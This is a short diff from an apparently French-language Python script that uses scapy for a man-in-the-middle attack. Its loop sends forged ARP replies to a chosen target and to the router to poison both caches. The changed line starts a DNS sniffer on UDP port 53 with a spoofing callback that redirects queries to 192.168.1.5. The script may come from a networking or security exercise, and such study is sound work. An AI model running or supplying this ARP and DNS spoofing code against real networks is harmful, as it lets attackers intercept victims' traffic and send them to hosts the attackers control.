@@ -82,7 +82,7 @@ def main():
     routeur=input('Entrez le numéro du routeur : ')
     routeur=pcs[int(routeur)-1]
     print('Vous avez choisi : ' + routeur[0] + ' ' + routeur[1])
-    scapy.AsyncSniffer(prn=forwardDnsSpoofing(), filter='udp port 53', iface=interface).start()
+    scapy.AsyncSniffer(prn=forwardDnsSpoofing("192.168.1.5"), filter='udp port 53', iface=interface).start()
     while True:
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
